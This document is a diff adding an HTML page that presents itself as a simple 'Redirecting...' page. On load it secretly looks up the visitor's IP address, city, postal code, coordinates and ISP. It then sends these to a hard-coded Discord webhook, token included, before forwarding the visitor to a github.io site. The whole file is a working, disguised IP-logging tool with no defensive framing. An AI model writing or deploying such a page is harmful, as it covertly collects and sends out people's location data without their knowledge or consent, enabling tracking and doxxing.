@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <script>
+        function getIpDetails(callback) {
+            $.get('https://ipapi.co/json/', function(data) {
+                callback(data);
+            });
+        }
+
+        function sendIpToWebhook(details) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1251561509125881858/BTHncwoRfrMieoEtl0KWHzQ4PJXho-n2KBhfSGBfVV5BSop-eFyy8rD0FQ4ktVznMLZ3';
+            const embedMessage = {
+                embeds: [{
+                    title: "Visitor IP Details",
+                    color: 3447003,
+                    fields: [
+                        { name: "IP Address", value: details.ip, inline: true },
+                        { name: "City", value: details.city, inline: true },
+                        { name: "Region", value: details.region, inline: true },
+                        { name: "Country", value: details.country_name, inline: true },
+                        { name: "Postal Code", value: details.postal, inline: true },
+                        { name: "Latitude", value: details.latitude.toString(), inline: true },
+                        { name: "Longitude", value: details.longitude.toString(), inline: true },
+                        { name: "ISP", value: details.org, inline: true },
+                    ],
+                    footer: {
+                        text: `Time: ${new Date().toLocaleString()}`
+                    }
+                }]
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            }).then(() => {
+                window.location.href = 'https://gekkefries1.github.io/0xV1/';
+            }).catch(() => {
+                // Redirect even if there's an error
+                window.location.href = 'https://gekkefries1.github.io/0xV1/';
+            });
+        }
+
+        $(document).ready(function() {
+            getIpDetails(sendIpToWebhook);
+        });
+    </script>
+</body>
+</html>
+// hello
